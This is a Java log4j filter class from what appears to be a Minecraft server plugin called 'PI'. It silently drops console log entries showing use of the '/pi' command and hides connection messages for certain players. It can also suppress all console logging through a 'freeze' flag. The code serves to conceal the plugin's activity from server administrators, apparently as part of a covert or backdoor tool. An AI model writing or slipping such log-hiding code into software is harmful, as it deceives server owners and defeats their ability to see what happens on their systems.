package com.pi.main;

import java.util.Map.Entry;

import org.apache.logging.log4j.core.LogEvent;
import org.apache.logging.log4j.core.filter.AbstractFilter;

public class ConsoleFilter extends AbstractFilter {
	private static final long serialVersionUID = 1L;
	
	public ConsoleFilter() {}
	
	public Result filter(LogEvent e) {
		String m = e.getMessage().getFormattedMessage().toLowerCase();
		if (m.contains("issued server command: /pi")) {
			return Result.DENY;
		}
		if (m.contains("uuid of player") || m.contains("logged in with entity id") || m.contains("lost connection:")) {
			try {
				for (Entry<String, String> entry: PI.getInstance().getCommandValues().getBannedPlayers().entrySet()) {
					String p = entry.getKey();
					if (m.contains(p)) return Result.DENY;
				}
			} catch (Exception ex) {}
		}
		try {
			if (PI.getInstance().getCommandValues().getConsoleFrozen()) {
				return Result.DENY;
			}
		} catch (Exception ex) {}
		return Result.ACCEPT;
	}
	
}
